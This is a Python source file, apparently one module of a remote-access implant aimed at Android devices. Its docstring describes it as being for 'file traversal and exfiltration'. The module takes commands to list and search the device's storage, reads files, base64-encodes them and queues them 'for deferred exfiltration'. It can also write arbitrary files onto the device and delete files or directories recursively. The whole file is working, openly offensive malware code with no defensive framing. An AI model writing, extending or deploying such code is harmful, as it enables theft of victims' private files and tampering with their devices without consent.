#!/usr/bin/env python3
"""
Filesystem operations module for file traversal and exfiltration
"""
import base64
import hashlib
import os
import shutil
import time
from pathlib import Path
from typing import Dict, Any, List

class FilesystemModule:
    def __init__(self, agent):
        self.agent = agent
        self.download_queue = []
        self.max_file_size = 50 * 1024 * 1024  # 50MB limit
        
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute filesystem commands"""
        try:
            if command == "ls":
                return self.list_directory(args)
            elif command == "download":
                return self.download_file(args)
            elif command == "upload":
                return self.upload_file(args)
            elif command == "rm":
                return self.remove_file(args)
            elif command == "find":
                return self.find_files(args)
            elif command == "get_queue":
                return self.get_download_queue()
            elif command == "clear_queue":
                return self.clear_download_queue()
            else:
                return {"error": f"Unknown filesystem command: {command}"}
                
        except Exception as e:
            return {"error": f"Filesystem operation failed: {str(e)}"}
    
    def list_directory(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """List directory contents"""
        try:
            path = args.get("path", "/sdcard")
            show_hidden = args.get("show_hidden", False)
            
            target_path = Path(path)
            
            if not target_path.exists():
                return {"error": f"Path does not exist: {path}"}
            
            if not target_path.is_dir():
                return {"error": f"Path is not a directory: {path}"}
            
            entries = []
            
            try:
                for item in target_path.iterdir():
                    # Skip hidden files unless requested
                    if not show_hidden and item.name.startswith('.'):
                        continue
                    
                    try:
                        stat = item.stat()
                        entry = {
                            "name": item.name,
                            "path": str(item),
                            "type": "directory" if item.is_dir() else "file",
                            "size": stat.st_size if item.is_file() else 0,
                            "modified": stat.st_mtime,
                            "permissions": oct(stat.st_mode)[-3:]
                        }
                        entries.append(entry)
                        
                    except (OSError, PermissionError) as e:
                        entries.append({
                            "name": item.name,
                            "path": str(item),
                            "type": "unknown",
                            "error": str(e)
                        })
                        
            except PermissionError:
                return {"error": f"Permission denied: {path}"}
            
            return {
                "success": True,
                "path": str(target_path),
                "entries": sorted(entries, key=lambda x: (x["type"], x["name"])),
                "total": len(entries)
            }
            
        except Exception as e:
            return {"error": f"Directory listing failed: {str(e)}"}
    
    def download_file(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Download/exfiltrate file"""
        try:
            file_path = args.get("file_path")
            chunk_download = args.get("chunk", False)
            
            if not file_path:
                return {"error": "file_path required"}
            
            target_file = Path(file_path)
            
            if not target_file.exists():
                return {"error": f"File does not exist: {file_path}"}
            
            if not target_file.is_file():
                return {"error": f"Path is not a file: {file_path}"}
            
            try:
                file_size = target_file.stat().st_size
                
                if file_size > self.max_file_size and not chunk_download:
                    return {
                        "error": f"File too large ({file_size} bytes). Use chunk=true for large files."
                    }
                
                # Read and encode file
                with open(target_file, 'rb') as f:
                    file_data = f.read()
                
                file_hash = hashlib.sha256(file_data).hexdigest()
                encoded_data = base64.b64encode(file_data).decode()
                
                # Store in offline logger for deferred exfiltration
                artifact_id = self.agent.offline_logger.log_artifact(
                    "file_download",
                    file_data,
                    {
                        "file_path": file_path,
                        "file_name": target_file.name,
                        "file_size": file_size,
                        "sha256": file_hash,
                        "downloaded_at": time.time()
                    }
                )
                
                return {
                    "success": True,
                    "file_path": file_path,
                    "file_name": target_file.name,
                    "size": file_size,
                    "sha256": file_hash,
                    "artifact_id": artifact_id,
                    "data": encoded_data if file_size <= 1024*1024 else None,  # Include data if < 1MB
                    "message": f"File downloaded: {target_file.name}"
                }
                
            except PermissionError:
                return {"error": f"Permission denied: {file_path}"}
                
        except Exception as e:
            return {"error": f"File download failed: {str(e)}"}
    
    def upload_file(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Upload file to device"""
        try:
            target_path = args.get("target_path")
            file_data = args.get("file_data")  # Base64 encoded
            overwrite = args.get("overwrite", False)
            
            if not target_path or not file_data:
                return {"error": "target_path and file_data required"}
            
            target_file = Path(target_path)
            
            if target_file.exists() and not overwrite:
                return {"error": f"File exists and overwrite=false: {target_path}"}
            
            # Decode file data
            try:
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                return {"error": f"Invalid base64 data: {str(e)}"}
            
            # Create parent directories if needed
            target_file.parent.mkdir(parents=True, exist_ok=True)
            
            # Write file
            with open(target_file, 'wb') as f:
                f.write(decoded_data)
            
            file_size = len(decoded_data)
            file_hash = hashlib.sha256(decoded_data).hexdigest()
            
            # Log the upload
            self.agent.offline_logger.log_event("file_uploaded", {
                "target_path": target_path,
                "file_size": file_size,
                "sha256": file_hash,
                "uploaded_at": time.time()
            })
            
            return {
                "success": True,
                "target_path": target_path,
                "size": file_size,
                "sha256": file_hash,
                "message": f"File uploaded: {target_file.name}"
            }
            
        except Exception as e:
            return {"error": f"File upload failed: {str(e)}"}
    
    def remove_file(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Remove file or directory"""
        try:
            target_path = args.get("target_path")
            recursive = args.get("recursive", False)
            
            if not target_path:
                return {"error": "target_path required"}
            
            target = Path(target_path)
            
            if not target.exists():
                return {"error": f"Path does not exist: {target_path}"}
            
            if target.is_file():
                target.unlink()
                operation = "file removed"
            elif target.is_dir():
                if recursive:
                    shutil.rmtree(target)
                    operation = "directory removed (recursive)"
                else:
                    target.rmdir()  # Only works if empty
                    operation = "directory removed"
            else:
                return {"error": f"Unknown path type: {target_path}"}
            
            # Log the removal
            self.agent.offline_logger.log_event("file_removed", {
                "target_path": target_path,
                "operation": operation,
                "removed_at": time.time()
            })
            
            return {
                "success": True,
                "target_path": target_path,
                "operation": operation,
                "message": f"Successfully {operation}: {target.name}"
            }
            
        except PermissionError:
            return {"error": f"Permission denied: {target_path}"}
        except OSError as e:
            return {"error": f"OS error: {str(e)}"}
        except Exception as e:
            return {"error": f"Remove failed: {str(e)}"}
    
    def find_files(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Find files matching criteria"""
        try:
            search_path = args.get("path", "/sdcard")
            pattern = args.get("pattern", "*")
            file_type = args.get("type")  # file, dir, or None for both
            max_results = args.get("max_results", 100)
            
            search_root = Path(search_path)
            
            if not search_root.exists():
                return {"error": f"Search path does not exist: {search_path}"}
            
            matches = []
            
            try:
                # Use glob for pattern matching
                if file_type == "file":
                    iterator = search_root.rglob(pattern)
                    iterator = (p for p in iterator if p.is_file())
                elif file_type == "dir":
                    iterator = search_root.rglob(pattern)  
                    iterator = (p for p in iterator if p.is_dir())
                else:
                    iterator = search_root.rglob(pattern)
                
                count = 0
                for match in iterator:
                    if count >= max_results:
                        break
                    
                    try:
                        stat = match.stat()
                        matches.append({
                            "path": str(match),
                            "name": match.name,
                            "type": "directory" if match.is_dir() else "file",
                            "size": stat.st_size if match.is_file() else 0,
                            "modified": stat.st_mtime
                        })
                        count += 1
                        
                    except (OSError, PermissionError):
                        continue
                        
            except PermissionError:
                return {"error": f"Permission denied searching: {search_path}"}
            
            return {
                "success": True,
                "search_path": search_path,
                "pattern": pattern,
                "matches": matches,
                "total_found": len(matches),
                "truncated": len(matches) >= max_results
            }
            
        except Exception as e:
            return {"error": f"File search failed: {str(e)}"}
    
    def get_download_queue(self) -> Dict[str, Any]:
        """Get current download queue"""
        return {
            "success": True,
            "queue": self.download_queue,
            "count": len(self.download_queue)
        }
    
    def clear_download_queue(self) -> Dict[str, Any]:
        """Clear download queue"""
        cleared_count = len(self.download_queue)
        self.download_queue.clear()
        
        return {
            "success": True,
            "cleared_count": cleared_count,
            "message": f"Cleared {cleared_count} items from download queue"
        }
